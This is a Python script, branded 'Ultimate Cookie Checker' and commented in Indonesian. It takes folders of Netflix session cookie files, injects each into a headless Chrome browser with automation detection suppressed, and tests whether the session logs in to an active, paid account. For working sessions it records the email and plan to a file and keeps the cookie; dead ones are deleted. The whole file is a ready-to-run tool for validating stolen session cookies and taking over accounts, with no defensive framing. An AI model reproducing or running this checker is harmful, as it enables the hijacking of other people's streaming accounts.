#!/usr/bin/env python3
import os
import sys
import time
import glob
import shutil
from datetime import datetime

from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from webdriver_manager.chrome import ChromeDriverManager

# ===================================================================
# KONFIGURASI WARNA CLI
# ===================================================================
BIRU = '\033[94m'    # Warna default saat scanning
HIJAU = '\033[92m'   # Warna untuk VALID
MERAH = '\033[91m'   # Warna untuk INVALID / ERROR
RESET = '\033[0m'    # Reset warna

# ===================================================================
# KONFIGURASI FOLDER
# ===================================================================
COOKIE_FOLDER = "cookies"
ACTIVE_FOLDER = "active_account"
ACCOUNTS_FILE = "netflix_accounts.txt"
LOG_FILE = "scan_history.log"

# ===================================================================
# FUNGSI BANNER & LOGO (BIRU)
# ===================================================================
def print_banner():
    banner = f"""
{BIRU}
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃  ███╗   ██╗███████╗████████╗███████╗██╗  ██╗██╗ ██╗   ┃
┃  ████╗  ██║██╔════╝╚══██╔══╝██╔════╝╚██╗██╔╝██║ ██║   ┃
┃  ██╔██╗ ██║█████╗     ██║   █████╗   ╚███╔╝ ██║ ██║   ┃
┃  ██║╚██╗██║██╔══╝     ██║   ██╔══╝   ██╔██╗ ██║ ╚═╝   ┃
┃  ██║ ╚████║██║        ██║   ███████╗██╔╝ ██╗██║ ██╗   ┃
┃  ╚═╝  ╚═══╝╚═╝        ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝ ╚═╝   ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
         🗡️   ULTIMATE COOKIE CHECKER v24.0   🗡️
            by adooo · Open Source Premium
{RESET}"""
    print(banner)

# ===================================================================
# FUNGSI UTILITY
# ===================================================================
def ensure_folders():
    os.makedirs(ACTIVE_FOLDER, exist_ok=True)
    os.makedirs(COOKIE_FOLDER, exist_ok=True)

def get_all_cookie_files():
    return glob.glob(os.path.join(os.getcwd(), COOKIE_FOLDER, "*.txt"))

def parse_cookies(file_path):
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            lines = f.readlines()
        cookies = []
        for line in lines:
            line = line.strip()
            if not line or line.startswith('#'): continue
            parts = line.split('\t')
            if len(parts) >= 7:
                cookies.append({
                    'name': parts[5], 'value': parts[6], 'domain': parts[0],
                    'path': parts[2], 'secure': parts[3] == 'TRUE', 'expiry': int(parts[4]) if parts[4].isdigit() else None
                })
        return cookies if cookies else None
    except Exception:
        return None

def remove_cookie_file(file_path):
    try: os.remove(file_path); return True
    except Exception: return False

def move_cookie_file(file_path):
    try:
        shutil.move(file_path, os.path.join(os.getcwd(), ACTIVE_FOLDER, os.path.basename(file_path)))
        return True
    except Exception: return False

def log_to_file(message):
    with open(LOG_FILE, 'a', encoding='utf-8') as f:
        f.write(f"[{datetime.now().isoformat()}] {message}\n")

# ===================================================================
# CORE SCAN ENGINE (WARNA BIRU SAAT SCAN, BERUBAH SAAT SELESAI)
# ===================================================================
def scan_file(file_path, index, total):
    file_name = os.path.basename(file_path)
    
    # Selama scanning: SEMUA TEKS BERWARNA BIRU
    print(f"\r{BIRU}⏳ Scanning [{index:03}/{total:03}]: {file_name:<40}{RESET}", end='', flush=True)

    options = Options()
    options.add_argument('--headless')
    options.add_argument('--no-sandbox')
    options.add_argument('--disable-dev-shm-usage')
    options.add_argument('--disable-blink-features=AutomationControlled')
    options.add_argument('--log-level=3')
    
    service = Service(ChromeDriverManager().install())
    driver = webdriver.Chrome(service=service, options=options)
    driver.implicitly_wait(5)

    try:
        cookies = parse_cookies(file_path)
        if not cookies:
            remove_cookie_file(file_path)
            # MERAH: Format file rusak (semua teks merah)
            print(f"\r{MERAH}❌ [{index:03}/{total:03}] INVALID FORMAT: {file_name:<40}{RESET}")
            driver.quit()
            return False

        # Buka Login & Inject Cookies
        driver.get('https://www.netflix.com/login')
        time.sleep(2)
        for c in cookies:
            try:
                clean_c = {'name': c['name'], 'value': c['value'], 'domain': '.netflix.com', 'path': '/'}
                if c.get('expiry') and isinstance(c['expiry'], int): 
                    clean_c['expiry'] = c['expiry']
                driver.add_cookie(clean_c)
            except: pass

        driver.get('https://www.netflix.com/login')
        time.sleep(3)

        # TES LOGIN MANUAL
        try:
            sign_in_btn = WebDriverWait(driver, 5).until(
                EC.element_to_be_clickable((By.XPATH, "//button[contains(text(),'Sign In')]"))
            )
            sign_in_btn.click()
            time.sleep(5)
        except:
            pass

        final_url = driver.current_url
        page_source = driver.page_source

        # PREMIUM FILTER: Deteksi Kuat untuk Payment Hold
        payment_keywords = [
            "Update payment", "Select Plan", "add payment", "Payment method", 
            "We were unable to process", "Billing", "Subscription", "Plan details",
            "choose your plan", "confirm your payment", "Your plan is paused"
        ]
        is_payment_hold = any(keyword in page_source for keyword in payment_keywords)

        # VALIDASI INTI
        if 'browse' in final_url and not is_payment_hold:
            # >> HIJAU: AKUN VALID! (semua teks hijau) <<
            try:
                email = driver.find_element(By.CSS_SELECTOR, '.account-email').text.strip()
                plan = driver.find_element(By.CSS_SELECTOR, '.plan-details, .membership-plan').text.strip()
            except:
                email, plan = "Unknown", "Unknown"
            
            # Simpan ke File .txt
            with open(ACCOUNTS_FILE, 'a', encoding='utf-8') as f:
                f.write(f"Email: {email}\nPlan: {plan}\nFile: {file_name}\nDate: {datetime.now()}\n{'-'*50}\n")
            
            move_cookie_file(file_path)
            log_to_file(f"SUCCESS: {email} | {plan}")
            driver.quit()
            
            # HIJAU: Seluruh teks berwarna hijau
            print(f"\r{HIJAU}✅ [{index:03}/{total:03}] {email:<40} | {plan}{RESET}")
            return True
            
        else:
            # >> MERAH: GAGAL (semua teks merah) <<
            remove_cookie_file(file_path)
            log_to_file(f"FAILED: {file_name} (Payment Hold/Invalid)")
            driver.quit()
            
            if is_payment_hold:
                # MERAH: Payment Hold
                print(f"\r{MERAH}💳 [{index:03}/{total:03}] PAYMENT BLOCK: {file_name:<40}{RESET}")
            else:
                # MERAH: Invalid Login
                print(f"\r{MERAH}❌ [{index:03}/{total:03}] INVALID LOGIN: {file_name:<40}{RESET}")
            return False

    except Exception as e:
        try: driver.quit()
        except: pass
        remove_cookie_file(file_path)
        # MERAH: System Error
        print(f"\r{MERAH}⚠️ [{index:03}/{total:03}] SYSTEM ERROR: {file_name:<40}{RESET}")
        return False

# ===================================================================
# MAIN PROGRAM
# ===================================================================
def main():
    ensure_folders()
    print_banner()
    
    files = get_all_cookie_files()
    total = len(files)
    
    # Seluruh header berwarna BIRU
    print(f"{BIRU}╔══════════════════════════════════════════╗{RESET}")
    print(f"{BIRU}║ 📂  Total Cookies Loaded: {total:03} files{RESET}")
    print(f"{BIRU}║ 🗡️  Mode: Premium Auto-Check {RESET}")
    print(f"{BIRU}╚══════════════════════════════════════════╝{RESET}")
    print()
    
    if total == 0:
        # MERAH: Error (semua teks merah)
        print(f"{MERAH}❌ ERROR: Folder '{COOKIE_FOLDER}' is empty!{RESET}")
        print(f"{BIRU}💡 Tip: Place your .txt files into the 'cookies' folder and try again.{RESET}")
        print(f"{BIRU}💡 Folder 'cookies/' has been created automatically.{RESET}")
        return

    print(f"{BIRU}▶ Initializing scan engine...{RESET}")
    time.sleep(1)
    
    success_count = 0
    
    for i, file_path in enumerate(files):
        if scan_file(file_path, i + 1, total):
            success_count += 1

    # Hasil akhir: berubah warna sesuai status
    print(f"\n{BIRU}╔══════════════════════════════════════════╗{RESET}")
    if success_count > 0:
        # HIJAU: Jika ada akun valid
        print(f"{HIJAU}║ ✅ SCAN COMPLETED! Found {success_count} Valid Accounts{RESET}")
        print(f"{HIJAU}║ 📁 Saved to folder: '{ACTIVE_FOLDER}'{RESET}")
        print(f"{HIJAU}║ 📝 Report saved to: '{ACCOUNTS_FILE}'{RESET}")
    else:
        # MERAH: Jika tidak ada akun valid
        print(f"{MERAH}║ ❌ SCAN COMPLETED. No usable accounts found.{RESET}")
    print(f"{BIRU}║ 🗡️ by adooo ;P{RESET}")
    print(f"{BIRU}╚══════════════════════════════════════════╝{RESET}")

if __name__ == "__main__":
    main()
